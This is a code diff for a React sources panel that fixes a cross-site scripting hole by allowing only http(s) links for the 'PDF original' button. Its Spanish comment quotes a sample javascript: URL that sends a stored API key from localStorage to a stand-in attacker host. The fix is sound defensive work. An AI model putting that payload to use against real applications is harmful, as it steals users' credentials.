@@ -1,5 +1,23 @@
 import type { SourceRef } from "../types";
 
+/**
+ * React NO bloquea esquemas peligrosos en `href`: solo avisa por consola y
+ * renderiza igual. `source_url` viene del frontmatter que escribe el pipeline
+ * OCR a partir del enlace del portal, así que un valor manipulado como
+ * `javascript:fetch('https://evil/'+localStorage.getItem('sein-rag-api-key'))`
+ * se convertía en un enlace "PDF original" que exfiltraba la API key al
+ * primer click. Solo se aceptan http(s).
+ */
+function safeHref(url: string | null): string | null {
+  if (!url) return null;
+  try {
+    const parsed = new URL(url, window.location.origin);
+    return parsed.protocol === "https:" || parsed.protocol === "http:" ? parsed.href : null;
+  } catch {
+    return null;
+  }
+}
+
 interface Props {
   sources: SourceRef[];
   highlighted: number | null;
@@ -61,8 +79,13 @@ export function SourcesPanel({ sources, highlighted, onClose }: Props) {
             </dl>
             {s.section && <div className="source-section">§ {s.section}</div>}
             <p className="source-snippet">{s.snippet}…</p>
-            {s.source_url && (
-              <a href={s.source_url} target="_blank" rel="noreferrer" className="source-link">
+            {safeHref(s.source_url) && (
+              <a
+                href={safeHref(s.source_url)!}
+                target="_blank"
+                rel="noreferrer noopener"
+                className="source-link"
+              >
                 PDF original ↗
               </a>
             )}
